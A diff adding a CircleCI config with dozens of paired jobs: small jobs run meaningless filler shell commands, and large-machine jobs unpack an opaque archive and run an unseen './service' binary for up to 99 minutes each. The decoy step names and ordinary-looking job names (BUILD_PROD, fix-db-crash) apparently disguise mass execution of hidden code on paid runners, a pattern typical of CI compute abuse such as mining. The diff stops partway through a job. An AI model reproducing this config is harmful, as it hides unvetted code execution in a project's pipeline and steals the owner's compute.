@@ -1,0 +1,1773 @@
+version: 2.1
+
+jobs:
+  hydrate_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: shrimp squat
+          command: |
+            mkdir -p /var/tmp/ws
+            set +o pipefail 2>/dev/null; seq 1 1212439 | awk '{print $1*7919 % 2147483647}' > /var/tmp/ws/output.txt; true
+            echo "baseline emitted ($(wc -l </var/tmp/ws/output.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - output.txt
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/output.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  enqueue_sm-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: hip hinge
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; command -v tar >/dev/null && echo tar-present || echo tar-absent; true ; } > /var/tmp/ws/step-14.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/step-14.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - step-14.log
+  sm-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/step-14.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  B_bug-9581:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: pickup slow
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 200000 | sort -nr | head -1; true ; } > /var/tmp/ws/step-3.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/step-3.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - step-3.log
+  bug-9581:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/step-3.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  Alpha_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: triple knock
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; head -c 15728640 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /var/tmp/ws/stage-complete.out
+            echo "baseline emitted ($(wc -l </var/tmp/ws/stage-complete.out) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - stage-complete.out
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/stage-complete.out > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  package_BUILD_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: loud mode
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; sed -n '/^root/p' /etc/passwd | head -1 | md5sum; true ; } > /var/tmp/ws/artifact.tar
+            echo "baseline emitted ($(wc -l </var/tmp/ws/artifact.tar) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - artifact.tar
+  BUILD_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/artifact.tar > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  prefetch_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: pump up
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if(c[int($1/10)]++)}' | wc -l 2>/dev/null || seq 1 100 | awk '{c[int($1/10)]++}END{for(k in c)print k,c[k]}'; true ; } > /var/tmp/ws/stats.csv
+            echo "baseline emitted ($(wc -l </var/tmp/ws/stats.csv) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - stats.csv
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/stats.csv > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  teardown_WEB-570:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: sumo pull
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; grep -En '^[a-z]+' <<<$'alpha\n123\nbeta\n456' | wc -l; true ; } > /var/tmp/ws/84.out
+            echo "baseline emitted ($(wc -l </var/tmp/ws/84.out) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 84.out
+  WEB-570:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/84.out > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  phase2_run-production-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: superman row
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="aaabbbccc"; gsub(/[ac]/,"-",s); print s}'; true ; } > /var/tmp/ws/FINAL
+            echo "baseline emitted ($(wc -l </var/tmp/ws/FINAL) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - FINAL
+  run-production-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/FINAL > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  db_rollout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: orbit sync
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; echo "abc" | tr abc 123; true ; } > /var/tmp/ws/handoff.ok
+            echo "baseline emitted ($(wc -l </var/tmp/ws/handoff.ok) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - handoff.ok
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/handoff.ok > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  stepB_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: run downwind
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; grep -i hELLO <<<$'Hello World\nHELLO AGAIN\nhello\n'; true ; } > /var/tmp/ws/audit.gz
+            echo "baseline emitted ($(wc -l </var/tmp/ws/audit.gz) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - audit.gz
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/audit.gz > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  deps_fix-db-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: ornamentation
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nd\ne\n" | nl 2>/dev/null | head -3 || printf "a\nb\nc\nd\ne\n" | awk '{print NR,$0}' | head -3; true ; } > /var/tmp/ws/34.bin
+            echo "baseline emitted ($(wc -l </var/tmp/ws/34.bin) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 34.bin
+  fix-db-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/34.bin > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  rerun_fix-999:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: splash
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 200000 | sort -nr | head -1; true ; } > /var/tmp/ws/stash.blob
+            echo "baseline emitted ($(wc -l </var/tmp/ws/stash.blob) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - stash.blob
+  fix-999:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/stash.blob > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  canary_greg-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nova spark
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 532160 | paste - - - - | wc -l; true ; } > /var/tmp/ws/91.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/91.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 91.log
+  greg-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/91.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  inspect_APP-311:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: more flaky
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 20 | xargs -n 4 2>/dev/null | wc -l; true ; } > /var/tmp/ws/804.data
+            echo "baseline emitted ($(wc -l </var/tmp/ws/804.data) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 804.data
+  APP-311:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/804.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  prebuild_wip-router-v2-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: tide
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_sl && echo t > /tmp/_sl/t && ln -s /tmp/_sl/t /tmp/_sl/l && readlink /tmp/_sl/l && rm -rf /tmp/_sl; true ; } > /var/tmp/ws/FINAL.txt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/FINAL.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - FINAL.txt
+  wip-router-v2-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/FINAL.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  drain_update-metrics:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: line up wait
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | md5sum; true ; } > /var/tmp/ws/ckpt-A.pt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/ckpt-A.pt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - ckpt-A.pt
+  update-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/ckpt-A.pt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  validate_yuki-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: siege
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "%d %d\n" 10 20 | awk '{print $1+$2, $1*$2}'; true ; } > /var/tmp/ws/counts.tsv
+            echo "baseline emitted ($(wc -l </var/tmp/ws/counts.tsv) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - counts.tsv
+  yuki-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/counts.tsv > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  env_add-db:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: clean and jerk
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=0;b=1; for(i=0;i<20;i++){print b; c=a+b; a=b; b=c}}' | wc -l; true ; } > /var/tmp/ws/audit.ndjson
+            echo "baseline emitted ($(wc -l </var/tmp/ws/audit.ndjson) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - audit.ndjson
+  add-db:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/audit.ndjson > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  warmer_succes-only:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spoor
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /var/tmp/ws/timings.tsv
+            echo "baseline emitted ($(wc -l </var/tmp/ws/timings.tsv) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - timings.tsv
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/timings.tsv > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  do_dan-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: silent mode
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; echo "$RANDOM" | base64; true ; } > /var/tmp/ws/68.blob
+            echo "baseline emitted ($(wc -l </var/tmp/ws/68.blob) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 68.blob
+  dan-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/68.blob > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  resync_ci-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: quintet knock
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 15 | awk '{if($1%3==0 && $1%5==0)print "FizzBuzz"; else if($1%3==0)print "Fizz"; else if($1%5==0)print "Buzz"; else print $1}' | wc -l; true ; } > /var/tmp/ws/195.out
+            echo "baseline emitted ($(wc -l </var/tmp/ws/195.out) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 195.out
+  ci-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/195.out > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  kick_PrepareImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: chinup
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=5 2>/dev/null | gzip -9 | wc -c; true ; } > /var/tmp/ws/step-24.txt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/step-24.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - step-24.txt
+  PrepareImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/step-24.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  generate_sam-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: peanut tool
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0; n=5000; for(i=0;i<n;i++)t+=(i*31+7)%97; print t}'; true ; } > /var/tmp/ws/timings.json
+            echo "baseline emitted ($(wc -l </var/tmp/ws/timings.json) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - timings.json
+  sam-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/timings.json > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  hook_PROD_MERGE_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: accelerando
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; tty 2>/dev/null || echo no-tty; true ; } > /var/tmp/ws/.done
+            echo "baseline emitted ($(wc -l </var/tmp/ws/.done) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - .done
+  PROD_MERGE_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/.done > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  verify_november:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: lighthouse
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=50 2>/dev/null | tr '\0' 'z' | wc -c; true ; } > /var/tmp/ws/passoff.txt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/passoff.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - passoff.txt
+  november:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/passoff.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  inspect_v5-rc5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: press decline
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "line a\nline b\nline c\n" | wc -l; true ; } > /var/tmp/ws/stats.json
+            echo "baseline emitted ($(wc -l </var/tmp/ws/stats.json) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - stats.json
+  v5-rc5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/stats.json > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  kick_hu-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: flutter kick
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0;for(i=1;i<=100;i++)t+=1/i;printf "%.6f\n",t}'; true ; } > /var/tmp/ws/cache.raw
+            echo "baseline emitted ($(wc -l </var/tmp/ws/cache.raw) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - cache.raw
+  hu-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
